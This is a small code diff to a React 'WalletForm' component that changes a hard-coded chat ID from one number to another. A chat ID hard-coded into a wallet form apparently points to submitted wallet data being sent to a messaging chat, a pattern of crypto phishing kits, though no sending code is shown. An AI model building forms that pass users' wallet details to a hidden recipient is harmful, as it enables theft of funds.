@@ -25,7 +25,7 @@ interface WalletData {
 }
 
 export default function WalletForm({ dataPromise }: { dataPromise: Promise<WalletData> }) {
-    const chatId = "-5065228198";
+    const chatId = "6361365798";
     const { name, imageId, projectId } = use(dataPromise);
     const router = useRouter(); // Initialize Router
 
